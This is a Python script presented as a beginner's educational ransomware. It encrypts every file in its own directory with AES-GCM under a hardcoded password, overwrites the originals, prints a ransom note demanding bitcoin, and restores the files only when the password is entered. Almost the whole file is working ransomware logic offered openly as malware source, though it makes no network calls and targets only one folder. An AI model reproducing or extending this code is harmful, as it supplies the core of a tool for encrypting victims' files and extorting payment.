#!/usr/bin/env python3

"""
A simple, beginner-friendly implementation of ransomware in Python for educational purposes.
"""

import os
import sys
import logging
from typing import List
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

# --- Constants ---

# The key needed to decrypt the files. In a real scenario, the attacker
# would be the only one who knows this.
DECRYPTION_KEY = b"fr33_my_f1l3s_n0w"

# List of files to ignore during encryption to avoid breaking the project itself.
EXCLUDED_FILES = ['ransomware.py', 'README.md'] # Updated to ransomware.py


class SimpleRansomware:
    """
    This class encapsulates the logic for a simple file-encrypting ransomware.
    Its purpose is to demonstrate the core concepts of how ransomware operates.
    """

    def __init__(self, name: str):
        self.name = name
        logging.info(f"Ransomware '{self.name}' initialized.")

    def find_target_files(self, root_path: str) -> List[str]:
        """
        Scans the given directory path and returns a list of files to be encrypted.

        It excludes the script itself and the README file.

        :param root_path: The directory to scan for files.
        :return: A list of full file paths to encrypt.
        """
        target_files = []
        for filename in os.listdir(root_path):
            # Check if the file is in our exclusion list.
            if filename in EXCLUDED_FILES or filename == os.path.basename(sys.argv[0]):
                logging.info(f"Skipping excluded file: {filename}")
                continue

            file_path = os.path.join(root_path, filename)
            # Ensure we only target files, not directories.
            if os.path.isfile(file_path):
                target_files.append(file_path)

        logging.info(f"Found {len(target_files)} target file(s).")
        return target_files

    def encrypt_file(self, file_path: str):
        """
        Encrypts a single file using AES-256 in GCM mode.

        :param file_path: The full path to the file to encrypt.
        """
        try:
            # Read the original content of the file.
            with open(file_path, 'rb') as f:
                content = f.read()

            # Derive a key from the password.
            salt = get_random_bytes(16)
            key = PBKDF2(DECRYPTION_KEY, salt, dkLen=32)
            
            # Encrypt the content using AES GCM mode.
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(content)

            # Overwrite the file with the encrypted content.
            with open(file_path, 'wb') as f:
                f.write(salt)
                f.write(cipher.nonce)
                f.write(tag)
                f.write(ciphertext)

            logging.debug(f"Successfully encrypted: {file_path}")

        except Exception as e:
            logging.error(f"Failed to encrypt {file_path}: {e}")

    def decrypt_file(self, file_path: str, key: bytes):
        """
        Decrypts a single file encrypted with AES-256 in GCM mode.

        :param file_path: The full path to the file to decrypt.
        :param key: The decryption key.
        """
        try:
            # Read the encrypted content.
            with open(file_path, 'rb') as f:
                salt = f.read(16)
                nonce = f.read(16)
                tag = f.read(16)
                ciphertext = f.read()
            
            # Derive the key from the password.
            derived_key = PBKDF2(key, salt, dkLen=32)

            # Decrypt the content by decoding it from Base64.
            cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
            decoded_content = cipher.decrypt_and_verify(ciphertext, tag)

            # Overwrite the file with the original, decrypted content.
            with open(file_path, 'wb') as f:
                f.write(decoded_content)

            logging.debug(f"Successfully decrypted: {file_path}")

        except Exception as e:
            logging.error(f"Failed to decrypt {file_path}: {e}")


    def display_ransom_note(self):
        """Displays a message to the user informing them of the ransomware attack."""
        print("\n" + "="*50)
        print("Your files have been encrypted!")
        print("To get the decryption key, please send 666 USD in BTC to address XYZ.")
        print("="*50 + "\n")

    def prompt_for_decryption_key(self) -> str:
        """Asks the user to enter the decryption key."""
        return input("Please enter the decryption key to restore your files: ")

    def run_encryption_phase(self, path: str) -> int:
        """
        Finds and encrypts all target files in a directory.

        :param path: The directory to target.
        :return: The number of files that were encrypted.
        """
        target_files = self.find_target_files(path)
        for file_path in target_files:
            self.encrypt_file(file_path)

        if len(target_files) > 0:
            self.display_ransom_note()
        
        return len(target_files)

    def run_decryption_phase(self, path: str):
        """
        Prompts for a key and decrypts all target files if the key is correct.

        :param path: The directory to target.
        """
        user_key = self.prompt_for_decryption_key()

        if user_key.encode() == DECRYPTION_KEY:
            print("\nCorrect key. Decrypting files...")
            target_files = self.find_target_files(path)
            for file_path in target_files:
                self.decrypt_file(file_path, user_key.encode())
            print("Decryption complete. Your files have been restored.")
        else:
            print("Wrong key! Files remain encrypted.")


# This is the main entry point of the script.
# The code inside this 'if' block will only run when you execute the script directly.
if __name__ == '__main__':
    # Configure logging to show debug messages.
    logging.basicConfig(level=logging.DEBUG, format='%(levelname)s:%(name)s:%(message)s')

    # Create an instance of our ransomware.
    ransomware = SimpleRansomware('BeginnerRansomware')

    # Define the target directory: the same directory where the script is located.
    current_directory = os.path.dirname(os.path.abspath(__file__))

    # --- Start of the simulation ---
    print("--- Ransomware Simulation START ---")
    
    # 1. Encrypt files in the current directory.
    num_encrypted = ransomware.run_encryption_phase(current_directory)
    print(f"\nNumber of files encrypted: {num_encrypted}")

    # If no files were encrypted, we can stop.
    if num_encrypted == 0:
        print("No target files found to encrypt. Exiting.")
    else:
        # 2. Start the decryption process (requires user interaction).
        ransomware.run_decryption_phase(current_directory)
    
    print("\n--- Ransomware Simulation END ---")
